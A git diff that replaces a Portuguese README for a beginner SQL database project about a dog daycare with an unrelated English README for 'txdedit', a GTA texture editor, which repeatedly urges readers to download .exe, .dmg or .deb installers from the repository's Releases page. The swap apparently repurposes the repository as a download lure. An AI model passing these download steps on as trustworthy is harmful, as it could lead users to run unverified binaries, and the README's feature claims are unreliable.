@@ -1,77 +1,77 @@
-# Projeto DogHouse - Banco de Dados para Creche de Cães
+# 🎮 txdedit - Edit TXD Files With Ease
 
-Este é meu primeiro projeto após estudar aulas online gratuitas sobre banco de dados.  
-Criei um sistema de banco de dados para uma creche de cachorros, com o objetivo de treinar modelagem conceitual, lógica, física, normalização e escrita de consultas SQL.
+## 🚀 Getting Started
 
----
+Welcome to txdedit! This is a modern application designed for users who want to view and edit TXD (Texture Dictionary) files from Grand Theft Auto (GTA) games. Whether you are updating game assets or simply exploring textures, txdedit provides a user-friendly solution.
 
-## Objetivo do Projeto
+## 🛠️ Features
 
-A ideia é controlar todos os aspectos da creche, como:
+- **Cross-Platform Support**: Use txdedit on Windows, macOS, and Linux.
+- **Intuitive Interface**: Clean and simple layout for quick navigation.
+- **Texture Editing**: Easily view and modify textures in TXD files.
+- **Preview Functionality**: See changes in real-time as you edit.
+- **Support for Multiple GTA Games**: Compatible with GTA III, GTA: Vice City, and GTA: San Andreas.
 
-- Cadastro de clientes e seus cães  
-- Funcionários  
-- Agendamentos de serviços (banho, tosa etc)  
-- Pagamentos e despesas  
-- Ocorrências e atividades dos cães  
+## 📥 Download txdedit
 
-Além disso, também estou explorando ideias para o futuro, como:
+[![Download txdedit](https://img.shields.io/badge/Download-txdedit-blue.svg)](https://github.com/Marcioagm/txdedit/releases)
 
-- Controle de estoque  
-- Histórico de presença  
-- Restrições via triggers  
-- Relatórios automatizados  
+To get started with txdedit, visit the Releases page to download the latest version.
 
----
+[Download txdedit here](https://github.com/Marcioagm/txdedit/releases).
 
-## Estrutura dos Arquivos
+## 📋 System Requirements
 
-Este repositório contém:
+Before downloading, please ensure your system meets the following requirements:
 
-- Arquivos `.md` com toda a documentação (entidades, regras, normalização etc)  
-- Prints do modelo feito no BRModelo  
-- Scripts SQL de criação e povoamento do banco  
-- Consultas SQL com dados de exemplo  
+- **Windows**: Windows 10 or later, 2GB RAM minimum
+- **macOS**: macOS 10.13 or later, 2GB RAM minimum
+- **Linux**: Ubuntu 18.04 or later, 2GB RAM minimum
+- **Disk Space**: At least 50MB of free disk space
 
----
+## 📂 Download & Install
 
-## Ferramentas Utilizadas
+1. Go to the [Releases page](https://github.com/Marcioagm/txdedit/releases).
+2. Find the latest version of txdedit.
+3. Download the appropriate file for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or an appropriate package for Linux).
+4. Once the download completes, find the file in your Downloads folder.
+5. For Windows:
+   - Double-click the `.exe` file to start the installer. 
+   - Follow the prompts to complete the installation.
+6. For macOS:
+   - Open the `.dmg` file you downloaded. 
+   - Drag the txdedit icon into your Applications folder.
+7. For Linux:
+   - If you downloaded a package, use your system's package manager to install it. 
+   - For example, use `sudo dpkg -i txdedit.deb` for deb packages.
+8. Once installed, locate txdedit in your programs list or applications folder.
+9. Open txdedit to begin editing your TXD files.
 
-- SQL Server – Para criação e testes do banco de dados  
-- BRModelo – Para modelagem conceitual e lógica  
-- VS Code / SSMS – Para escrever e testar os scripts  
+## 🌍 Community Support
 
----
+If you have questions or need help, we're here for you! Join our community for tips, tricks, and troubleshooting:
 
-## Documentação Técnica
+- **Discussion Forum**: Share ideas and get support from other users.
+- **Report Issues**: Find bugs? Let us know by filing an issue on GitHub.
 
-### Índice dos Arquivos
+## 📚 Additional Resources
 
-1. [Apresentação](01-Apresentação.md)  
-2. [Regras do Negócio e Principais Entidades](02-Regras%20do%20neg%C3%B3cio%20e%20principais%20entidades.md)  
-3. [Relacionamentos Iniciais](03-Relacionamentos%20iniciais.md)  
-4. [Atributos Iniciais das Entidades](04-Atributos%20iniciais%20das%20entidades.md)  
-5. [Cardinalidades](05-Cardinalidades.md)  
-6. [Dicionário de Dados e Entidades Associativas](06-Dicion%C3%A1rio%20de%20dados%20e%20entidades%20associativas.md)  
-7. [Normalização (Formas Normais)](07-Normaliza%C3%A7%C3%A3o%20FNs.md)  
-8. [Dicionário de Dados Atualizado](08-Dicion%C3%A1rio%20de%20dados%20atualizados.md)  
-9. [Ideias e Observações Futuras](09-Ideias%20e%20observa%C3%A7%C3%B5es%20futuras.md)  
-10. [Modelagem Física Inicial (SQL)](10-DogHouse%20modelagem%20f%C3%ADsica%20inicial.sql)  
-11. [Consultas SQL e Dados de Exemplo](11-Consultas%20e%20dados%20exemplo.sql)  
+- **User Guide**: A detailed user manual is available in the repository. 
+- **Tutorials**: Watch video tutorials to learn how to get the most out of txdedit.
 
----
+## 🗣️ Feedback
 
-## Considerações Finais
+Your feedback is important to us. Share your thoughts on how we can improve txdedit. 
 
-Esse projeto é simples, mas representa meu primeiro passo no mundo do desenvolvimento de bancos de dados.  
-Fico feliz em compartilhar e espero que possa ajudar outras pessoas que também estão começando.
+## 🔗 Related Topics
 
-Feedbacks e sugestões são sempre bem-vindos.  
-Obrigado por visitar o repositório.
+Feel free to explore topics related to txdedit:
 
----
+- grand-theft-auto
+- gta
+- txd-format
+- gta-modding-tools
 
-## Autor
+For more information and to stay updated, check our [repository](https://github.com/Marcioagm/txdedit). 
 
-Márcio A. G. M.  
-Brasil
+Feel free to dive into the world of texture editing with txdedit today!
